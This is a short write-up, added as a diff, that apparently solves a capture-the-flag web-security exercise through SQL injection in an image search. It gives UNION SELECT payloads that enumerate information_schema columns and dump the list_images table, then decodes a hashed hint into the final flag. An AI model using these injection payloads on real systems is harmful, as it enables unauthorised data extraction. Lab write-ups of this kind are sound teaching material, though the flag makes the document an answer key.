@@ -1,0 +1,33 @@
+Same principle as the "Member's SQL Injection"
+
+
+# get all the columns from the tables
+0 union SELECT table_name, column_name FROM information_schema.columns
+
+We get :
+- [...]
+- list_images.id
+- list_images.url
+- list_images.title
+- list_images.comment
+- [...]
+
+
+# knowing table's columns, we can now get the data from the 'list_images' table itself
+0 union SELECT NULL, concat(id, url, title, comment) FROM list_images
+
+We get :
+- 1https://www.nsa.org/img.jpgNsaAn image about the NSA !
+- 2https://www.42.fr/42.png42 !There is a number..
+- 3https://www.google.fr/google.pngGoogleGoogle it !
+- 4https://www.obama.org/obama.jpgObamaYes we can !
+- 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+- 6https://www.h4x0r3.0rg/tr0ll.pngtr00lBecause why not ?
+
+
+# We just decode the flag as before
+
+decoded (1928e8083cf461a51303633093573c46) : albatroz
+hash to sha256 : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+Done !
